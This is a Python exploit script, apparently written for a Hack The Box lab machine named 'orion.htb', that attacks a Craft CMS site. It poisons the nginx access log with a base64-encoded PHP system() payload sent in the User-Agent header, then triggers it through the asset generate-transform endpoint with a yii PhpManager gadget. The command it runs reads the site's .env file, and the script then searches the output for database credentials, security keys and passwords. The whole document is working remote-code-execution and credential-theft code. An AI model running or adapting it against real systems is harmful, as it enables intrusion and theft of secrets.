#!/usr/bin/env python3
import requests
import socket
import urllib3
import base64
import re

urllib3.disable_warnings()

TARGET_IP = "10.129.244.146"
_orig = socket.getaddrinfo
def p(h, *a, **kw):
    return _orig("10.129.244.146" if h == "orion.htb" else h, *a, **kw)
socket.getaddrinfo = p

s = requests.Session()
s.verify = False

# Get CSRF
r = s.get("http://orion.htb/actions/users/session-info", headers={"Accept": "application/json"})
csrf = r.json()["csrfTokenValue"]

# Payload
cmd = "cat /html/craft/.env"
cmd_b64 = base64.b64encode(cmd.encode()).decode()
php = f"<?php system(base64_decode('{cmd_b64}'));?>"

# Poison
s.get("http://orion.htb/", headers={"User-Agent": php})

# Trigger
data = [
    ("CRAFT_CSRF_TOKEN", csrf),
    ("assetId", "2"),
    ("handle[width]", "1"),
    ("handle[height]", "1"),
    ("handle[as x][class]", "yii\\rbac\\PhpManager"),
    ("handle[as x][itemFile]", "/var/log/nginx/access.log"),
]
r = s.post("http://orion.htb/actions/assets/generate-transform", data=data)

# Save and search for env vars
with open("/mnt/c/HTB/Orion/http/E28_env_response.txt", "w", encoding="utf-8", errors="ignore") as f:
    f.write(r.text)

# Extract environment variables
print("[+] Searching for DB credentials in response...")
for match in re.finditer(r'(CRAFT_DB_[A-Z_]+|APP_ID|SECURITY_KEY)=([^\n<>&"\']+)', r.text):
    print(f"{match.group(1)}={match.group(2)}")

# Also search for common patterns
for line in r.text.split("\n"):
    if any(x in line.lower() for x in ["root", "password", "db_", "secret", "key"]):
        print(line[:150])
